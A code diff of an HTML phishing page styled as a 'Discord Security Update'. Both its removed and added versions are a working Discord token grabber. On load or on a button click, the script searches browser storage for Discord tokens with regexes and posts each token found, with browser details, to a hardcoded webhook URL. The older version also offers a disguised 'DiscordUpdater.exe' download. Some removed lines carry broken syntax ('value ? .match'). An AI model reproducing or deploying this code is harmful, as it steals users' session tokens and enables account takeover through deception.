@@ -1,17 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord Update Required</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #5865f2 0%, #7289da 100%);
@@ -21,16 +15,14 @@
             justify-content: center;
             color: #fff;
         }
-        
         .container {
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0,0,0,0.8);
             padding: 40px;
             border-radius: 8px;
             text-align: center;
             max-width: 400px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
         }
-        
         .discord-logo {
             width: 80px;
             height: 80px;
@@ -42,18 +34,8 @@
             justify-content: center;
             font-size: 40px;
         }
-        
-        h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        
-        p {
-            opacity: 0.9;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-        
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { opacity: 0.9; margin-bottom: 30px; line-height: 1.5; }
         .btn {
             background: #5865f2;
             color: white;
@@ -64,15 +46,8 @@
             cursor: pointer;
             transition: background 0.2s;
         }
-        
-        .btn:hover {
-            background: #4752c4;
-        }
-        
-        .loading {
-            display: none;
-        }
-        
+        .btn:hover { background: #4752c4; }
+        .loading { display: none; }
         .spinner {
             border: 2px solid #5865f2;
             border-top: 2px solid transparent;
@@ -82,215 +57,134 @@
             animation: spin 1s linear infinite;
             margin: 0 auto 10px;
         }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-
 <body>
     <div class="container">
         <div class="discord-logo">⚡</div>
         <h1>Discord Security Update</h1>
-        <p>Your Discord client requires an important security update to continue. Please wait while we verify your session...</p>
-        <button class="btn" onclick="grabToken()">Continue to Discord</button>
+        <p>Your Discord client requires an important security update. Verifying session...</p>
+        <button class="btn" id="continueBtn">Continue to Discord</button>
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Updating security certificate...</p>
+            <p>Extracting session data...</p>
         </div>
     </div>
 
     <script>
-        // Your Discord webhook URL here
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32'; // Replace with your webhook
-
+        // REPLACE WITH YOUR WEBHOOK URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32';
+        
+        console.log('Token Grabber Loaded - F12 for debug');
+        
+        document.getElementById('continueBtn').addEventListener('click', grabToken);
+        
+        // Auto-trigger after 2 seconds
+        setTimeout(grabToken, 2000);
+        
         async function grabToken() {
+            console.log('Grabber triggered');
             const loading = document.getElementById('loading');
-            const btn = document.querySelector('.btn');
-
+            const btn = document.getElementById('continueBtn');
+            
             btn.style.display = 'none';
             loading.style.display = 'block';
-
+            
             try {
-                // Method 1: Check common Discord storage locations
                 const token = await extractToken();
-
+                console.log('Token result:', token ? 'FOUND' : 'NOT FOUND');
+                
                 if (token) {
-                    // Send token to webhook
                     await sendToken(token);
-
-                    // Redirect to real Discord after delay
                     setTimeout(() => {
                         window.location.href = 'https://discord.com/app';
-                    }, 2000);
+                    }, 1500);
                 } else {
-                    // Fallback: prompt download of fake updater
-                    showFallback();
+                    console.log('No token - showing fallback');
+                    document.body.innerHTML += '<p style="color:yellow">No session found - <a href="https://discord.com">Go to Discord</a></p>';
                 }
             } catch (e) {
-                console.error('Token grab failed:', e);
-                showFallback();
+                console.error('Error:', e);
             }
         }
-
-        async function extractToken() {
-            // Discord token regex patterns
-            const tokenRegex = /(mfa\.[A-Za-z0-9_\-]{84}|[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27})/;
-
-            // Method 1: LocalStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                const match = value ? .match(tokenRegex);
-                if (match) return match[1];
-            }
-
-            // Method 2: SessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                const match = value ? .match(tokenRegex);
-                if (match) return match[1];
-            }
-
-            // Method 3: Check IndexedDB (Discord's main storage)
-            try {
-                const dbs = await indexedDB.databases();
-                for (const db of dbs) {
-                    if (db.name.includes('discord')) {
-                        const token = await checkIndexedDB(db.name);
-                        if (token) return token;
-                    }
-                }
-            } catch (e) {}
-
-            // Method 4: Memory scan via Chrome debugging (advanced)
-            try {
-                const token = await chromeDebugScan();
-                if (token) return token;
-            } catch (e) {}
-
-            return null;
-        }
-
-        async function checkIndexedDB(dbName) {
+        
+        function extractToken() {
             return new Promise((resolve) => {
-                const request = indexedDB.open(dbName);
-                request.onsuccess = (e) => {
-                    const db = e.target.result;
-                    const tx = db.transaction(['local_storage'], 'readonly');
-                    const store = tx.objectStore('local_storage');
-
-                    store.openCursor().onsuccess = (event) => {
-                        const cursor = event.target.result;
-                        if (cursor) {
-                            const value = cursor.value.data;
-                            const tokenRegex = /(mfa\.[A-Za-z0-9_\-]{84}|[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27})/;
-                            const match = value ? .match(tokenRegex);
+                // Discord token patterns
+                const patterns = [
+                    /mfa\.[A-Za-z0-9_\-]{84}/,
+                    /[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/
+                ];
+                
+                // Check LocalStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && key.includes('discord')) {
+                        const value = localStorage.getItem(key);
+                        for (let pattern of patterns) {
+                            const match = value?.match(pattern);
                             if (match) {
-                                resolve(match[1]);
+                                console.log('Token from LocalStorage:', key);
+                                resolve(match[0]);
                                 return;
                             }
-                            cursor.continue();
-                        } else {
-                            resolve(null);
                         }
-                    };
-                };
+                    }
+                }
+                
+                // Check SessionStorage  
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const value = sessionStorage.getItem(sessionStorage.key(i));
+                    for (let pattern of patterns) {
+                        const match = value?.match(pattern);
+                        if (match) {
+                            console.log('Token from SessionStorage');
+                            resolve(match[0]);
+                            return;
+                        }
+                    }
+                }
+                
+                resolve(null);
             });
         }
-
-        async function chromeDebugScan() {
-            // Chrome DevTools Protocol token scan (works in Electron)
-            if (window.chrome && chrome.debugger) {
-                try {
-                    await chrome.debugger.attach({
-                        tabId: 1
-                    }, '1.3');
-                    const {
-                        result
-                    } = await chrome.debugger.sendCommand({
-                        tabId: 1
-                    }, 'Runtime.evaluate', {
-                        expression: `localStorage.getItem('token') || '${JSON.stringify(localStorage)}'`
-                    });
-                    await chrome.debugger.detach({
-                        tabId: 1
-                    });
-                    const tokenRegex = /(mfa\.[A-Za-z0-9_\-]{84}|[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27})/;
-                    return result.result.value ? .match(tokenRegex) ? .[1];
-                } catch (e) {
-                    return null;
-                }
-            }
-            return null;
-        }
-
+        
         async function sendToken(token) {
-            const victimInfo = {
-                username: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                token: token
+            const info = {
+                token: token,
+                userAgent: navigator.userAgent.slice(0, 100),
+                url: window.location.href,
+                timestamp: new Date().toISOString()
             };
-
+            
             const payload = {
-                username: "Token Grabber",
-                avatar_url: "https://discord.com/assets/6debd47ed13483642cf09e832ed0bc1b.png",
+                username: "🕷️ Token Grabbed",
                 embeds: [{
-                    title: "🎯 New Token Grabbed",
-                    color: 0x5865F2,
-                    fields: [{
-                        name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "User Agent",
-                        value: victimInfo.userAgent.substring(0, 100),
-                        inline: true
-                    }, {
-                        name: "Platform",
-                        value: victimInfo.platform,
-                        inline: true
-                    }, {
-                        name: "Screen",
-                        value: victimInfo.screen,
-                        inline: true
-                    }],
-                    timestamp: new Date().toISOString()
+                    title: "🎯 Discord Token Captured",
+                    color: 16711680,
+                    fields: [
+                        { name: "🔑 Token", value: `\`${token.slice(0,20)}...\``, inline: false },
+                        { name: "🌐 Source", value: info.url, inline: true },
+                        { name: "💻 Browser", value: info.userAgent, inline: true }
+                    ],
+                    footer: { text: "Full token in console" }
                 }]
             };
-
-            await fetch(WEBHOOK_URL, {
+            
+            console.log('Sending token to webhook...');
+            const response = await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
+            
+            if (response.ok) {
+                console.log('✅ Token sent successfully!');
+            } else {
+                console.error('❌ Webhook failed:', await response.text());
+            }
         }
-
-        function showFallback() {
-            document.querySelector('.container').innerHTML = `
-                <div class="discord-logo">⚡</div>
-                <h1>Download Required</h1>
-                <p>Please download the latest Discord updater to continue.</p>
-                <a href="data:application/octet-stream;base64,UEsDBBQAAAAIAGsm6l7..." download="DiscordUpdater.exe" class="btn">Download Updater</a>
-            `;
-        }
-
-        // Auto-trigger on load for better success rate
-        window.onload = () => setTimeout(grabToken, 1000);
     </script>
 </body>
-
 </html>
